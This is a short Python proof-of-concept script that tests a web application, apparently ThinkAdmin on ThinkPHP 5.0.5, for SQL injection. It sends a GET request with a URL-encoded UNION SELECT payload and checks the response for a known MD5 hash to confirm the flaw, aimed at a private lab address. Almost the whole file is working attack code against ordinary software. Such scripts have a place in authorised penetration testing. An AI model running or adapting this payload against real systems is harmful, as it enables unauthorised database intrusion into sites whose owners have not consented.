#-*- coding:utf-8 -*-
import requests

def check(url):
    results = []
    items = {
        "Url": url, 
        "Vuln": 'thinkadmin_sql_injection_get', 
        "Type": None, 
        "Payload": None
    }

    payload = '?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+'

    try:
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        r = requests.get(url + payload, headers=headers)
        # md5(233)
        if "e165421110ba03099a1c0393373c5b43" in r.text:
            print("成功")
            items['Type'] = 'GET'
            items['Payload'] = payload
            results.append(items)
        return results

    except Exception as e:
        return e


if __name__ == '__main__':
    url = 'http://192.168.178.128/thinkphp_5.0.5_full/public/index.php/'
    check(url)